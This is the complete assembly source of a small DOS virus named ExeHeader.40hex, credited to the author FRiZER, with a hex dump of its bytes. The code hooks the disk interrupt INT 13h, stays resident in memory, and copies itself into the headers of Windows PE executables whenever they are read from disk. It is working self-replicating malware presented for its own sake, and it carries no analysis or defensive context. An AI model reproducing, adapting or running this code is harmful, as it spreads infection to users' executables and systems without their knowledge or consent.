
;  Virus ExeHeader.40hex by FRiZER (7.01.1900)
;  ~~~~~ Thanx to Z0MBiE for his Z0MBiE.32 ;-)

;  0000: B4 13 CD 2F 0E 1F BA 16 00 06 53 66 8F 44 40 CD
;  0010: 2F BA 40 00 CD 27 60 26 81 3F 4D 5A 75 20 26 8B
;  0020: 4F 18 83 F9 40 75 17 53 5F 03 F9 26 03 5D FC 26
;  0030: 81 3F 50 45 75 08 1E 0E 1F 33 F6 F3 A4 1F 61 EA

        .model small
        .386p
        .code
        org 0

start:  mov     ah, 13h                 ; get seg:ofs int13h (es:bx)
        int     2Fh

        push    cs                      ; ds:dx = new seg:ofs int13h
        pop     ds
        lea     dx, int13

        push    es                      ; save old seg:ofs int13h
        push    bx
        pop     dword ptr [si+old13-start]

        int     2Fh                     ; set seg:ofs int13h

        mov     dx,old13-start          ; TSR (keep dx bytes)
        int     27h

int13:  pusha

        cmp     word ptr es:[bx], 'ZM'  ; exe ?
        jne     exit13

        mov     cx,es:[bx+18h]          ; new exe ?
        cmp     cx,40h
        jne     exit13

        push    bx
        pop     di
        add     di,cx                   ; dst ofs

        add     bx,es:[di-4]
        cmp     word ptr es:[bx],'EP'   ; Portable Executable
        jne     exit13

        push    ds

        push    cs                      ; src seg
        pop     ds

        xor     si,si                   ; src ofs

        rep     movsb                   ; move body

        pop     ds

exit13: popa

        db      0EAh                    ; jmp far

old13   dd      ?

        end     start
